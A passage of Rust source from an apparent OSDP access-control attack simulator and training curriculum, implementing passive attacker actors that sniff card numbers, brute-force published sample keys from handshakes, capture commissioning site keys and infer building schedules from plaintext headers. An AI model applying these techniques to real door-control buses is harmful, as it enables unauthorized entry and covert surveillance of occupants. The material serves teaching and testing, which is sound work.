//! **The attacker who only listens.**
//!
//! Five actors that transmit nothing at all. Between them they cover the half
//! of the Mellon findings that need no interference whatsoever — which is the
//! uncomfortable half, because there is nothing for a bus monitor to see.
//!
//! | Actor | Curriculum | What it needs |
//! |---|---|---|
//! | [`PassiveEavesdropper`] | 2.2 | an unsecured bus |
//! | [`WeakKeyCracker`] | 3.2, 3.3 | one handshake, and a key from the published family |
//! | [`KeysetCapturer`] | 3.5 | to be present during commissioning |
//! | [`TrafficAnalyst`] | 4.1 | nothing. No key, ever |
//! | [`NullCipherReader`] | 4.4 | a link using SCS_15/SCS_16 |
//!
//! Every one of them is a [`PassiveTap`] and a reader of its buffer. The engine
//! enforces the "passive" part: a tap that reports [`TapKind::Passive`] cannot
//! transmit whatever its code asks for, so `injection_count` being zero is the
//! engine's statement rather than the actor's.

use alloc::boxed::Box;
use alloc::string::{String, ToString};
use alloc::vec::Vec;

use odr_bus::{
    BusDir, LinkId, Micros, PassiveTap, SeenTraffic, TapId, TapKind, TapPosition, World,
};
use odr_osdp::codes::{Command, Reply};
use odr_osdp::payload::KeysetCommand;
use odr_osdp::security::KeyType;
use odr_osdp::weak_keys;
use odr_osdp::{Frame, RawCardRead};
use odr_wiegand::BitVec;

use crate::error::{AttackError, Result};
use crate::knowledge::{
    BadgeEvent, CaptureMedium, CapturedCredential, KnowledgeCell, Known, ObservedFrame,
    ObservedHandshake, PlaintextHeader, Provenance, RecoveredKey, RecoveredPlaintext,
};
use crate::shadow::{self, DecryptedFrame, ShadowSession};
use crate::Attacker;

// ---------------------------------------------------------------------------
// Shared probe machinery
// ---------------------------------------------------------------------------

/// A passive probe on a bus: a tap handle and a read cursor.
///
/// Four of the five actors below are this plus an interpretation, which is the
/// finding rather than a shortcut — passive OSDP attacks differ in what they
/// make of the traffic, not in how they get it.
#[derive(Debug, Default)]
struct BusProbe {
    tap: Option<TapId>,
    consumed: usize,
}

impl BusProbe {
    fn attach(
        &mut self,
        world: &mut World,
        link: LinkId,
        name: &str,
        position: TapPosition,
    ) -> Result<TapId> {
        let id = world.add_tap_at(link, Box::new(PassiveTap::new(name.to_string())), position)?;
        self.tap = Some(id);
        Ok(id)
    }

    fn tap(&self, name: &str) -> Result<TapId> {
        self.tap.ok_or_else(|| AttackError::NotAttached {
            actor: name.to_string(),
        })
    }

    /// The traffic recorded since the last call.
    fn fresh<'a>(&mut self, world: &'a World, name: &str) -> Result<&'a [SeenTraffic]> {
        let tap = self.tap(name)?;
        let seen = world.tap(tap)?.seen();
        let from = self.consumed.min(seen.len());
        self.consumed = seen.len();
        Ok(&seen[from..])
    }
}

/// Turn one thing a tap saw on a bus into a frame observation.
fn bus_frame(seen: &SeenTraffic) -> Option<ObservedFrame> {
    let dir = seen.dir?;
    let frame = seen.frame()?;
    Some(ObservedFrame {
        t_us: seen.t_us,
        dir,
        frame,
    })
}

/// Pull the card bits out of an unencrypted `REPLY_RAW`.
fn card_read_in(frame: &Frame) -> Option<BitVec> {
    if !frame.is_reply || frame.reply_code() != Some(Reply::Raw) || frame.is_encrypted() {
        return None;
    }
    RawCardRead::decode(&frame.payload)
        .ok()
        .map(|raw| BitVec::from_bools(&raw.bits()))
}

// ---------------------------------------------------------------------------
// PassiveEavesdropper
// ---------------------------------------------------------------------------

/// **Mellon attack 1: read the card number off an unsecured bus.**
///
/// Encryption in OSDP is optional and frequently off, and when it is off a card
/// read crosses the bus as a `REPLY_RAW` whose payload is the Wiegand bits with
/// a four-byte header. This actor clips two wires onto the pair, waits, and
/// reads them.
///
/// Curriculum drill 2.2's flag is "the attacker actor has extracted a card
/// number matching the credential presented, from passive observation only —
/// zero frames injected", and both halves are checkable against engine state:
/// the card number is in [`crate::Knowledge::credentials`] and the injection
/// count is the world's own.
pub struct PassiveEavesdropper {
    name: String,
    knowledge: KnowledgeCell,
    probe: BusProbe,
}

impl core::fmt::Debug for PassiveEavesdropper {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.debug_struct("PassiveEavesdropper")
            .field("name", &self.name)
            .field("tap", &self.probe.tap)
            .finish()
    }
}

impl PassiveEavesdropper {
    /// A listener with a knowledge base of its own.
    pub fn new(name: impl Into<String>) -> PassiveEavesdropper {
        PassiveEavesdropper::sharing(name, KnowledgeCell::new())
    }

    /// A listener pooling what it learns with other actors.
    pub fn sharing(name: impl Into<String>, knowledge: KnowledgeCell) -> PassiveEavesdropper {
        PassiveEavesdropper {
            name: name.into(),
            knowledge,
            probe: BusProbe::default(),
        }
    }

    /// Clip it onto a bus.
    pub fn attach(&mut self, world: &mut World, link: LinkId) -> Result<TapId> {
        self.probe
            .attach(world, link, &self.name, TapPosition::default())
    }

    /// Clip it onto a bus at a chosen position.
    pub fn attach_at(
        &mut self,
        world: &mut World,
        link: LinkId,
        position: TapPosition,
    ) -> Result<TapId> {
        self.probe.attach(world, link, &self.name, position)
    }

    /// Take everything heard since the last call into the knowledge base.
    ///
    /// Returns how many new card numbers were recovered. Frames it cannot read
    /// are filed anyway: an attacker holds ciphertext it may be able to use
    /// later, and [`WeakKeyCracker`] and [`KeysetCapturer`] work off exactly
    /// that pile.
    pub fn harvest(&mut self, world: &World) -> Result<usize> {
        let tap = self.probe.tap(&self.name)?;
        let fresh = self.probe.fresh(world, &self.name)?;
        let mut frames: Vec<Known<ObservedFrame>> = Vec::new();
        let mut creds: Vec<Known<CapturedCredential>> = Vec::new();
        let mut addresses: Vec<Known<u8>> = Vec::new();
        let mut learned = 0;

        for s in fresh {
            let Some(obs) = bus_frame(s) else { continue };
            if obs.frame.is_reply {
                addresses.push(Known::observed(obs.frame.address, obs.t_us, Some(tap)));
            }
            if let Some(bits) = card_read_in(&obs.frame) {
                creds.push(Known::observed(
                    CapturedCredential {
                        bits,
                        t_us: obs.t_us,
                        link: Some(s.link),
                        segment: s.segment,
                        medium: CaptureMedium::OsdpRaw,
                        address: Some(obs.frame.address),
                    },
                    obs.t_us,
                    Some(tap),
                ));
                learned += 1;
            }
            frames.push(Known::observed(obs, s.t_us, Some(tap)));
        }

        self.knowledge.update(|k| {
            for a in addresses {
                if !k.addresses.iter().any(|x| x.value == a.value) {
                    k.addresses.push(a);
                }
            }
            k.credentials.extend(creds);
            k.frames.extend(frames);
        });
        Ok(learned)
    }

    /// The card numbers recovered so far.
    pub fn card_numbers(&self) -> Vec<u64> {
        self.knowledge
            .read(|k| k.card_numbers())
            .unwrap_or_default()
    }

    /// The credentials recovered so far, as bits.
    pub fn captures(&self) -> Vec<CapturedCredential> {
        self.knowledge
            .read(|k| {
                k.credentials
                    .iter()
                    .filter(|c| c.value.medium == CaptureMedium::OsdpRaw)
                    .map(|c| c.value.clone())
                    .collect()
            })
            .unwrap_or_default()
    }

    /// Every frame heard, in order.
    pub fn frames(&self) -> Vec<ObservedFrame> {
        self.knowledge
            .read(|k| k.observed_frames())
            .unwrap_or_default()
    }
}

impl Attacker for PassiveEavesdropper {
    fn name(&self) -> &str {
        &self.name
    }
    fn position(&self) -> TapKind {
        TapKind::Passive
    }
    fn knowledge(&self) -> &KnowledgeCell {
        &self.knowledge
    }
    fn tap(&self) -> Option<TapId> {
        self.probe.tap
    }
}

// ---------------------------------------------------------------------------
// WeakKeyCracker
// ---------------------------------------------------------------------------

/// **Mellon attack 4: recover the SCBK from a captured handshake.**
///
/// A large fraction of deployed OSDP uses a Secure Channel Base Key taken
/// verbatim from vendor sample code: a byte repeated sixteen times, or a short
/// ascending or descending run. That is about 768 keys, and the published
/// default SCBK-D is one of them.
///
/// `CMD_CHLNG` and `REPLY_CCRYPT` both travel **before any encryption exists**,
/// and between them they carry RND.A, RND.B and the client cryptogram. Four AES
/// operations per candidate tests the whole family offline. Nothing is
/// transmitted, nothing is interfered with, and there is no way for the bus to
/// notice.
///
/// Curriculum 3.3's flag is "attacker-recovered SCBK equals the PD's configured
/// SCBK, recovered from capture alone"; 3.2's is the same actor against SCBK-D,
/// going on to decrypt a card read with a [`ShadowSession`].
pub struct WeakKeyCracker {
    name: String,
    knowledge: KnowledgeCell,
    probe: BusProbe,
    candidates_tried: u128,
    mac_len: u8,
}

impl core::fmt::Debug for WeakKeyCracker {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.debug_struct("WeakKeyCracker")
            .field("name", &self.name)
            .field("tap", &self.probe.tap)
            .field("candidates_tried", &self.candidates_tried)
            .finish()
    }
}

impl WeakKeyCracker {
    /// A cracker with a knowledge base of its own.
    pub fn new(name: impl Into<String>) -> WeakKeyCracker {
        WeakKeyCracker::sharing(name, KnowledgeCell::new())
    }

    /// A cracker pooling what it learns with other actors.
    pub fn sharing(name: impl Into<String>, knowledge: KnowledgeCell) -> WeakKeyCracker {
        WeakKeyCracker {
            name: name.into(),
            knowledge,
            probe: BusProbe::default(),
            candidates_tried: 0,
            mac_len: 4,
        }
    }

    /// Tell the cracker how wide the MACs on this bus are, so its shadow
    /// sessions verify them the same way the endpoints do.
    ///
    /// Four is the protocol's value and the default. A drill that has shortened
    /// it for curriculum 4.2 should say so here — and an attacker can measure
    /// it rather than be told; see [`crate::MacForger::calibrate`].
    pub fn with_mac_len(mut self, mac_len: u8) -> WeakKeyCracker {
        self.mac_len = mac_len.clamp(1, 4);
        self
    }

    /// Clip it onto a bus.
    pub fn attach(&mut self, world: &mut World, link: LinkId) -> Result<TapId> {
        self.probe
            .attach(world, link, &self.name, TapPosition::default())
    }

    /// Take everything heard since the last call into the knowledge base, and
    /// file any complete handshake it finds.
    pub fn harvest(&mut self, world: &World) -> Result<usize> {
        let tap = self.probe.tap(&self.name)?;
        let fresh = self.probe.fresh(world, &self.name)?;
        let new: Vec<Known<ObservedFrame>> = fresh
            .iter()
            .filter_map(bus_frame)
            .map(|o| {
                let t = o.t_us;
                Known::observed(o, t, Some(tap))
            })
            .collect();
        self.knowledge.update(|k| k.frames.extend(new));

        let frames = self
            .knowledge
            .read(|k| k.observed_frames())
            .unwrap_or_default();
        let mut found = 0;
        for address in shadow::handshake_addresses(&frames) {
            if let Some(h) = shadow::handshake_in(&frames, address) {
                let already = self
                    .knowledge
                    .read(|k| k.handshakes.iter().any(|x| x.value == h))
                    .unwrap_or(false);
                if !already {
                    self.knowledge
                        .update(|k| k.handshakes.push(Known::observed(h, h.t_us, Some(tap))));
                    found += 1;
                }
            }
        }
        Ok(found)
    }

    /// Sweep the published sample-key family against every captured handshake.
    ///
    /// Returns the keys recovered. A site using a key outside the family
    /// survives this, and the sweep says so by returning nothing rather than by
    /// failing.
    pub fn crack(&mut self) -> Result<Vec<RecoveredKey>> {
        let handshakes = self
            .knowledge
            .read(|k| {
                k.handshakes
                    .iter()
                    .map(|h| h.value)
                    .collect::<Vec<ObservedHandshake>>()
            })
            .unwrap_or_default();
        if handshakes.is_empty() {
            return Err(AttackError::nothing(
                "weak key sweep",
                "no handshake has been captured",
            ));
        }

        let mut out = Vec::new();
        for h in handshakes {
            if self
                .knowledge
                .read(|k| k.scbk_for(h.address).is_some())
                .unwrap_or(false)
            {
                continue;
            }
            let mut tried: u128 = 0;
            let mut hit = None;
            for pattern in weak_keys::enumerate() {
                tried += 1;
                let key = pattern.key();
                if shadow::key_fits(&key, &h) {
                    hit = Some((key, pattern));
                    break;
                }
            }
            self.candidates_tried = self.candidates_tried.saturating_add(tried);
            if let Some((key, pattern)) = hit {
                let mut recovered = RecoveredKey::scbk(key, Some(h.address));
                recovered.pattern = Some(pattern);
                recovered.key_type = Some(h.key_type);
                let r = recovered.clone();
                self.knowledge.update(|k| {
                    k.keys
                        .push(Known::new(r, Provenance::BruteForced { candidates: tried }))
                });
                out.push(recovered);
            }
        }
        Ok(out)
    }

    /// How many candidate keys have been tried in total.
    pub fn candidates_tried(&self) -> u128 {
        self.candidates_tried
    }

    /// Build a shadow of one address's session under the recovered key.
    pub fn shadow(&self, address: u8) -> Result<ShadowSession> {
        let (key, frames) = self
            .knowledge
            .read(|k| (k.scbk_for(address), k.observed_frames()))
            .unwrap_or((None, Vec::new()));
        let key = key.ok_or(AttackError::Unearned {
            wanted: "an SCBK for this address",
            detail: "nothing has been recovered for it yet".to_string(),
        })?;
        let key_type = self
            .knowledge
            .read(|k| k.handshake_for(address).map(|h| h.key_type))
            .flatten()
            .unwrap_or(KeyType::Default);
        ShadowSession::reconstruct(key, key_type, self.mac_len, address, &frames)
    }

    /// Decrypt everything the capture holds for one address.
    pub fn decrypt(&self, address: u8) -> Result<Vec<DecryptedFrame>> {
        let frames = self
            .knowledge
            .read(|k| k.observed_frames())
            .unwrap_or_default();
        let mut session = self.shadow(address)?;
        Ok(session.replay(&frames))
    }

    /// Decrypt the card reads for one address and file them as credentials the
    /// attacker holds.
    ///
    /// Curriculum drill 3.2's flag in one call.
    pub fn decrypt_card_reads(&mut self, address: u8) -> Result<Vec<CapturedCredential>> {
        let frames = self
            .knowledge
            .read(|k| k.observed_frames())
            .unwrap_or_default();
        let mut session = self.shadow(address)?;
        let reads = session.card_reads(&frames);
        let captures: Vec<CapturedCredential> = reads
            .into_iter()
            .map(|(t_us, bits)| CapturedCredential {
                bits,
                t_us,
                link: None,
                segment: 0,
                medium: CaptureMedium::OsdpRaw,
                address: Some(address),
            })
            .collect();
        let filed = captures.clone();
        self.knowledge.update(|k| {
            for c in filed {
                k.credentials.push(Known::derived(
                    c,
                    "a captured card read, decrypted under the recovered SCBK",
                ));
            }
        });
        Ok(captures)
    }
}

impl Attacker for WeakKeyCracker {
    fn name(&self) -> &str {
        &self.name
    }
    fn position(&self) -> TapKind {
        TapKind::Passive
    }
    fn knowledge(&self) -> &KnowledgeCell {
        &self.knowledge
    }
    fn tap(&self) -> Option<TapId> {
        self.probe.tap
    }
}

// ---------------------------------------------------------------------------
// KeysetCapturer
// ---------------------------------------------------------------------------

/// **Mellon attack 5: be on the bus during commissioning.**
///
/// There is no key exchange in OSDP to attack, because there is no key
/// exchange. A site key reaches a peripheral in a `CMD_KEYSET`, and the best
/// protection that command ever gets is a Secure Channel keyed with **SCBK-D,
/// which is published in the specification**. An attacker who is present when
/// an installer commissions a reader gets the site key for the whole
/// installation.
///
/// This actor handles both shapes:
///
/// * `CMD_KEYSET` sent with no security block at all — the key is simply in the
///   payload;
/// * `CMD_KEYSET` sent inside a channel under SCBK-D or another sample key — a
///   [`ShadowSession`] under the recovered key reads it.
///
/// Curriculum 3.5's flag has two halves: the payload was captured, and the
/// attacker can decrypt *subsequent* traffic. The second half works because a
/// controller re-handshakes under the new key immediately after pushing it, and
/// the attacker is holding that key by then.
pub struct KeysetCapturer {
    name: String,
    knowledge: KnowledgeCell,
    probe: BusProbe,
    mac_len: u8,
}

impl core::fmt::Debug for KeysetCapturer {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.debug_struct("KeysetCapturer")
            .field("name", &self.name)
            .field("tap", &self.probe.tap)
            .finish()
    }
}

impl KeysetCapturer {
    /// A capturer with a knowledge base of its own.
    pub fn new(name: impl Into<String>) -> KeysetCapturer {
        KeysetCapturer::sharing(name, KnowledgeCell::new())
    }

    /// A capturer pooling what it learns with other actors.
    pub fn sharing(name: impl Into<String>, knowledge: KnowledgeCell) -> KeysetCapturer {
        KeysetCapturer {
            name: name.into(),
            knowledge,
            probe: BusProbe::default(),
            mac_len: 4,
        }
    }

    /// Tell it how wide the MACs on this bus are. See
    /// [`WeakKeyCracker::with_mac_len`].
    pub fn with_mac_len(mut self, mac_len: u8) -> KeysetCapturer {
        self.mac_len = mac_len.clamp(1, 4);
        self
    }

    /// Clip it onto a bus.
    pub fn attach(&mut self, world: &mut World, link: LinkId) -> Result<TapId> {
        self.probe
            .attach(world, link, &self.name, TapPosition::default())
    }

    /// Take everything heard since the last call into the knowledge base.
    pub fn harvest(&mut self, world: &World) -> Result<usize> {
        let tap = self.probe.tap(&self.name)?;
        let fresh = self.probe.fresh(world, &self.name)?;
        let new: Vec<Known<ObservedFrame>> = fresh
            .iter()
            .filter_map(bus_frame)
            .map(|o| {
                let t = o.t_us;
                Known::observed(o, t, Some(tap))
            })
            .collect();
        let n = new.len();
        self.knowledge.update(|k| k.frames.extend(new));
        Ok(n)
    }

    /// Pull every site key out of the capture.
    ///
    /// Keys recovered here are filed in the knowledge base with a provenance of
    /// "observed" for a clear-text keyset and "derived" for one that had to be
    /// decrypted under a key the attacker already had.
    pub fn capture_keys(&mut self) -> Result<Vec<[u8; 16]>> {
        let frames = self
            .knowledge
            .read(|k| k.observed_frames())
            .unwrap_or_default();
        let keysets: Vec<ObservedFrame> = frames
            .iter()
            .filter(|f| !f.frame.is_reply && f.frame.command_code() == Some(Command::Keyset))
            .cloned()
            .collect();
        if keysets.is_empty() {
            return Err(AttackError::nothing(
                "keyset capture",
                "no CMD_KEYSET crossed the bus while the attacker was listening",
            ));
        }

        let mut out = Vec::new();
        for ks in keysets {
            let address = ks.frame.address;
            let secured = ks.frame.scs_type().is_some_and(|s| s.has_mac());
            let (key, provenance) = if !secured {
                let decoded = KeysetCommand::decode(&ks.frame.payload)?;
                match decoded.as_aes128() {
                    Some(k) => (
                        k,
                        Provenance::Observed {
                            t_us: ks.t_us,
                            tap: self.probe.tap,
                        },
                    ),
                    None => continue,
                }
            } else {
                match self.decrypt_keyset(&frames, address, &ks)? {
                    Some(k) => (
                        k,
                        Provenance::Derived {
                            from: "a CMD_KEYSET decrypted under the commissioning key",
                        },
                    ),
                    None => continue,
                }
            };
            let already = self.knowledge.read(|k| k.holds_scbk(&key)).unwrap_or(false);
            if !already {
                let recovered = RecoveredKey::scbk(key, Some(address));
                self.knowledge
                    .update(|k| k.keys.push(Known::new(recovered, provenance)));
            }
            out.push(key);
        }
        Ok(out)
    }

    /// Work out which key the commissioning channel was running under, and read
    /// the keyset payload with it.
    ///
    /// Candidates, in order, are all honestly available: keys the attacker
    /// already holds, then the published default SCBK-D, then the rest of the
    /// published sample family.
    fn decrypt_keyset(
        &self,
        frames: &[ObservedFrame],
        address: u8,
        keyset: &ObservedFrame,
    ) -> Result<Option<[u8; 16]>> {
        let handshake = match shadow::handshake_in(frames, address) {
            Some(h) => h,
            None => {
                return Err(AttackError::IncompleteHandshake {
                    address: Some(address),
                    missing: "the handshake the CMD_KEYSET was sent inside",
                })
            }
        };

        let mut candidates: Vec<[u8; 16]> = self
            .knowledge
            .read(|k| k.scbks())
            .unwrap_or_default()
            .into_iter()
            .collect();
        candidates.push(odr_osdp::SCBK_D);
        let commissioning = candidates
            .into_iter()
            .find(|c| shadow::key_fits(c, &handshake))
            .or_else(|| {
                weak_keys::enumerate()
                    .map(|p| p.key())
                    .find(|c| shadow::key_fits(c, &handshake))
            });
        let Some(commissioning) = commissioning else {
            return Ok(None);
        };

        // Replay the session from the handshake forward: the MAC chain has to
        // reach the keyset frame the same way the PD's did.
        let mut session = ShadowSession::reconstruct(
            commissioning,
            handshake.key_type,
            self.mac_len,
            address,
            frames,
        )?;
        for f in frames {
            if f.frame.address != address || f.t_us <= session.handshake_end_us() {
                continue;
            }
            if !f.frame.scs_type().is_some_and(|s| s.has_mac()) {
                continue;
            }
            let plaintext = session.open(f.dir, &f.frame).ok();
            if f.t_us == keyset.t_us && !f.frame.is_reply {
                if let Some(p) = plaintext {
                    return Ok(KeysetCommand::decode(&p).ok().and_then(|k| k.as_aes128()));
                }
                return Ok(None);
            }
        }
        Ok(None)
    }

    /// Decrypt the traffic that followed the commissioning, under the site key
    /// just captured.
    ///
    /// This is the second half of curriculum 3.5: the controller re-handshakes
    /// under the new key, and the attacker is already holding it.
    pub fn decrypt_after_commissioning(&self, address: u8) -> Result<Vec<DecryptedFrame>> {
        let (keys, frames) = self
            .knowledge
            .read(|k| (k.scbks(), k.observed_frames()))
            .unwrap_or_default();
        if keys.is_empty() {
            return Err(AttackError::Unearned {
                wanted: "a site key",
                detail: "no CMD_KEYSET has been captured yet".to_string(),
            });
        }
        // The site-key handshake is the *last* one for this address: the one
        // the controller ran after the PD accepted the new key.
        let later: Vec<ObservedFrame> = {
            let chlngs: Vec<Micros> = frames
                .iter()
                .filter(|f| {
                    f.frame.address == address
                        && !f.frame.is_reply
                        && f.frame.command_code() == Some(Command::Chlng)
                })
                .map(|f| f.t_us)
                .collect();
            let from = chlngs.last().copied().unwrap_or(0);
            frames.iter().filter(|f| f.t_us >= from).cloned().collect()
        };
        let mut last_err = AttackError::KeyRejected;
        for key in keys {
            match ShadowSession::reconstruct(key, KeyType::SiteKey, self.mac_len, address, &later)
                .or_else(|_| {
                    ShadowSession::reconstruct(key, KeyType::Default, self.mac_len, address, &later)
                }) {
                Ok(mut s) => return Ok(s.replay(&later)),
                Err(e) => last_err = e,
            }
        }
        Err(last_err)
    }
}

impl Attacker for KeysetCapturer {
    fn name(&self) -> &str {
        &self.name
    }
    fn position(&self) -> TapKind {
        TapKind::Passive
    }
    fn knowledge(&self) -> &KnowledgeCell {
        &self.knowledge
    }
    fn tap(&self) -> Option<TapId> {
        self.probe.tap
    }
}

// ---------------------------------------------------------------------------
// TrafficAnalyst
// ---------------------------------------------------------------------------

/// A day of a building, reconstructed with no key at all.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct TrafficTimeline {
    /// Every badge-in, in the order it happened.
    pub badge_events: Vec<BadgeEvent>,
    /// When the controller drove an output — a door opening, in nearly every
    /// installation.
    pub door_commands: Vec<Micros>,
    /// How many frames the analyst looked at.
    pub frames: usize,
    /// How much of the day it watched.
    pub span_us: Micros,
}

impl TrafficTimeline {
    /// The times of every badge-in.
    pub fn badge_times(&self) -> Vec<Micros> {
        self.badge_events.iter().map(|b| b.t_us).collect()
    }

    /// How many badge-ins the analyst believes happened.
    pub fn badge_count(&self) -> usize {
        self.badge_events.len()
    }

    /// Compare the inferred timeline with the engine's own record of when cards
    /// were actually presented.
    ///
    /// `tolerance_us` exists because the two are genuinely different instants:
    /// a card is presented, the reader takes a moment to read it, and the PD
    /// then holds the read until the controller next polls. An attacker
    /// watching the bus sees the third of those. The gap is the polling
    /// interval, which is itself observable, so the tolerance is a property of
    /// the bus rather than a fudge factor.
    pub fn compare(&self, presentations: &[Micros], tolerance_us: Micros) -> TimelineComparison {
        let mut used = alloc::vec![false; self.badge_events.len()];
        let mut matched = 0usize;
        let mut missed = Vec::new();
        for p in presentations {
            let hit = self.badge_events.iter().enumerate().position(|(i, b)| {
                !used[i] && b.t_us >= *p && b.t_us.saturating_sub(*p) <= tolerance_us
            });
            match hit {
                Some(i) => {
                    used[i] = true;
                    matched += 1;
                }
                None => missed.push(*p),
            }
        }
        let spurious = used.iter().filter(|u| !**u).count();
        TimelineComparison {
            matched,
            missed,
            spurious,
            claimed: self.badge_events.len(),
        }
    }
}

/// How an inferred timeline compares with what really happened.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TimelineComparison {
    /// Badge-ins the analyst got right.
    pub matched: usize,
    /// Badge-ins it missed entirely.
    pub missed: Vec<Micros>,
    /// Badge-ins it claimed that did not happen.
    pub spurious: usize,
    /// How many it claimed in total.
    pub claimed: usize,
}

impl TimelineComparison {
    /// True if every presentation was found and nothing was invented.
    pub fn is_exact(&self) -> bool {
        self.missed.is_empty() && self.spurious == 0
    }
}

/// **The one that should worry people: traffic analysis through encryption.**
///
/// The command and reply code byte sits *before* the encrypted region of an
/// OSDP frame. It is in the clear at every security level the protocol offers,
/// deliberately, so that a bus analyser can follow a conversation it has no key
/// for. The consequence is that an eavesdropper on a fully encrypted,
/// correctly-commissioned, site-keyed OSDP bus still sees:
///
/// ```text
/// POLL ACK POLL ACK POLL RAW ACK OUT ACK POLL ACK ...
/// ```
///
/// It cannot read the card number. It can read **the building's schedule**: who
/// arrives first, when the cleaners come, which door is used at 03:00, when a
/// wing is empty.
///
/// This actor is kept honest structurally rather than by promise. It never
/// stores a frame — it stores a [`PlaintextHeader`], which has no payload field
/// at all, so there is no payload byte in the analyst's possession for it to
/// accidentally use. There is a test that scrambles every payload in a capture
/// and asserts the analyst's output is byte-identical.
pub struct TrafficAnalyst {
    name: String,
    knowledge: KnowledgeCell,
    probe: BusProbe,
    headers: Vec<PlaintextHeader>,
    output_window_us: Micros,
}

impl core::fmt::Debug for TrafficAnalyst {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.debug_struct("TrafficAnalyst")
            .field("name", &self.name)
            .field("tap", &self.probe.tap)
            .field("headers", &self.headers.len())
            .finish()
    }
}

impl TrafficAnalyst {
    /// An analyst with a knowledge base of its own.
    pub fn new(name: impl Into<String>) -> TrafficAnalyst {
        TrafficAnalyst::sharing(name, KnowledgeCell::new())
    }

    /// An analyst pooling what it learns with other actors.
    pub fn sharing(name: impl Into<String>, knowledge: KnowledgeCell) -> TrafficAnalyst {
        TrafficAnalyst {
            name: name.into(),
            knowledge,
            probe: BusProbe::default(),
            headers: Vec::new(),
            output_window_us: 1_500_000,
        }
    }

    /// How long after a card read an output command still counts as "the door
    /// opened for that badge".
    ///
    /// An attacker measures this from the bus: it is a couple of poll
    /// intervals, and the poll interval is the most visible thing on an OSDP
    /// link.
    pub fn with_output_window(mut self, us: Micros) -> TrafficAnalyst {
        self.output_window_us = us;
        self
    }

    /// Clip it onto a bus.
    pub fn attach(&mut self, world: &mut World, link: LinkId) -> Result<TapId> {
        self.probe
            .attach(world, link, &self.name, TapPosition::default())
    }

    /// Take the **headers** of everything heard since the last call.
    ///
    /// Note what does not happen here: no payload is copied, decoded, stored or
    /// looked at. [`PlaintextHeader::from_frame`] reads the address, the
    /// direction, the id byte, the security block type and the length — every
    /// one of which is outside the encrypted region and on the wire for anyone.
    pub fn harvest(&mut self, world: &World) -> Result<usize> {
        let tap = self.probe.tap(&self.name)?;
        let fresh = self.probe.fresh(world, &self.name)?;
        let mut added = 0;
        let mut filed: Vec<Known<PlaintextHeader>> = Vec::new();
        for s in fresh {
            let Some(dir) = s.dir else { continue };
            let Some(frame) = s.frame() else { continue };
            let header = PlaintextHeader::from_frame(s.t_us, dir, &frame);
            self.headers.push(header);
            filed.push(Known::observed(header, s.t_us, Some(tap)));
            added += 1;
        }
        self.knowledge.update(|k| k.headers.extend(filed));
        Ok(added)
    }

    /// Feed the analyst headers from a capture rather than a live tap.
    ///
    /// Takes frames and reads only their headers, which is what makes the
    /// "never touched the payload" test possible: hand it a capture with every
    /// payload byte replaced and the answer must not move.
    pub fn ingest(&mut self, frames: &[ObservedFrame]) -> usize {
        let mut filed = Vec::new();
        for f in frames {
            let header = PlaintextHeader::from_frame(f.t_us, f.dir, &f.frame);
            self.headers.push(header);
            filed.push(Known::observed(header, f.t_us, None));
        }
        let n = filed.len();
        self.knowledge.update(|k| k.headers.extend(filed));
        n
    }

    /// The headers the analyst holds. There is no payload in any of them.
    pub fn headers(&self) -> &[PlaintextHeader] {
        &self.headers
    }

    /// **The timeline of the building's day.**
    ///
    /// A `REPLY_RAW` from an address is somebody presenting a card at that
    /// reader. A `CMD_OUT` to the same address shortly afterwards is the
    /// controller releasing the strike. Neither inference needs a key, and
    /// neither can be prevented without changing the protocol.
    pub fn timeline(&self) -> TrafficTimeline {
        let mut badge_events = Vec::new();
        let mut door_commands = Vec::new();
        for (i, h) in self.headers.iter().enumerate() {
            if h.is_output_command() {
                door_commands.push(h.t_us);
            }
            if !h.is_card_read() {
                continue;
            }
            let granted = self
                .headers
                .iter()
                .skip(i + 1)
                .take_while(|later| later.t_us.saturating_sub(h.t_us) <= self.output_window_us)
                .any(|later| later.is_output_command() && later.address == h.address);
            badge_events.push(BadgeEvent {
                t_us: h.t_us,
                address: h.address,
                granted: Some(granted),
            });
        }
        let span = match (self.headers.first(), self.headers.last()) {
            (Some(a), Some(b)) => b.t_us.saturating_sub(a.t_us),
            _ => 0,
        };
        TrafficTimeline {
            badge_events,
            door_commands,
            frames: self.headers.len(),
            span_us: span,
        }
    }

    /// Work out the timeline and file it in the knowledge base.
    pub fn analyse(&mut self) -> TrafficTimeline {
        let timeline = self.timeline();
        let events = timeline.badge_events.clone();
        self.knowledge.update(|k| {
            k.badge_events.clear();
            for e in events {
                k.badge_events.push(Known::derived(
                    e,
                    "the plaintext command byte of an encrypted bus",
                ));
            }
        });
        timeline
    }

    /// How many badge-ins the analyst believes happened.
    pub fn badge_count(&self) -> usize {
        self.timeline().badge_count()
    }
}

impl Attacker for TrafficAnalyst {
    fn name(&self) -> &str {
        &self.name
    }
    fn position(&self) -> TapKind {
        TapKind::Passive
    }
    fn knowledge(&self) -> &KnowledgeCell {
        &self.knowledge
    }
    fn tap(&self) -> Option<TapId> {
        self.probe.tap
    }
}

// ---------------------------------------------------------------------------
// NullCipherReader
// ---------------------------------------------------------------------------

/// **SCS_15 and SCS_16: authenticated, and not encrypted at all.**
///
/// Secure Channel has four session security levels, and two of them are null
/// ciphers. SCS_15 (command) and SCS_16 (reply) attach a MAC and leave the
/// payload exactly as it was. They are a legitimate, specified mode, they are
/// what an empty payload always uses, and some deployments select them for
/// every frame in the belief that "Secure Channel is on" means "the traffic is
/// encrypted".
///
/// It is not. A listener reads the payload straight off the wire. The MAC stops
/// it being *changed*, and does nothing whatever to stop it being *read*.
///
/// This actor reads any authenticated-but-unencrypted payload, and reports card
/// numbers separately from everything else because a card number is the thing a
/// drill asks about.
pub struct NullCipherReader {
    name: String,
    knowledge: KnowledgeCell,
    probe: BusProbe,
    readable: Vec<RecoveredPlaintext>,
}

impl core::fmt::Debug for NullCipherReader {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.debug_struct("NullCipherReader")
            .field("name", &self.name)
            .field("tap", &self.probe.tap)
            .field("readable", &self.readable.len())
            .finish()
    }
}

impl NullCipherReader {
    /// A reader with a knowledge base of its own.
    pub fn new(name: impl Into<String>) -> NullCipherReader {
